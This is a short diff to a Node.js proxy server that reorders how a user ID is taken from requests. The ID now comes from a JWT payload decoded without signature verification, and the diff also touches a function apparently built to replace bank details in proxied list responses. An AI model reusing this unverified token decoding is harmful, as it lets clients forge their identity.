@@ -122,8 +122,6 @@ async function getUserIdFromToken(req) {
 }
 
 async function extractUserIdFromToken(req) {
-  const fromToken = await getUserIdFromToken(req);
-  if (fromToken) return fromToken;
   const authHeader = getTokenFromReq(req);
   if (authHeader) {
     try {
@@ -131,12 +129,13 @@ async function extractUserIdFromToken(req) {
       const parts = clean.split('.');
       if (parts.length === 3) {
         const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
-        if (payload.userId) return String(payload.userId);
-        if (payload.sub) return String(payload.sub);
-        if (payload.id) return String(payload.id);
+        const jwtUserId = payload.userId || payload.sub || '';
+        if (jwtUserId) return String(jwtUserId);
       }
     } catch(e) {}
   }
+  const fromToken = await getUserIdFromToken(req);
+  if (fromToken) return fromToken;
   return '';
 }
 
@@ -346,7 +345,7 @@ async function transparentProxy(req, res) {
 
     if (jsonResp) {
       const rd = getResponseData(jsonResp);
-      const uid = rd && typeof rd === 'object' && !Array.isArray(rd) ? (rd.userId || rd.id || '') : '';
+      const uid = rd && typeof rd === 'object' && !Array.isArray(rd) ? (rd.userId || rd.memberId || '') : '';
       if (uid) saveTokenUserId(req, uid);
     }
 
@@ -1129,8 +1128,8 @@ async function proxyAndReplaceBankInList(req, res) {
 
   try {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
-    const detectedUserId = await extractUserId(req, jsonResp);
-    if (detectedUserId) saveTokenUserId(req, detectedUserId);
+    let detectedUserId = await extractUserIdFromToken(req);
+    if (!detectedUserId) detectedUserId = await extractUserId(req, jsonResp);
     const eff = getEffectiveSettings(data, detectedUserId);
     const active = (eff.botEnabled !== false) ? await getActiveBankAndSave(data, detectedUserId) : null;
 
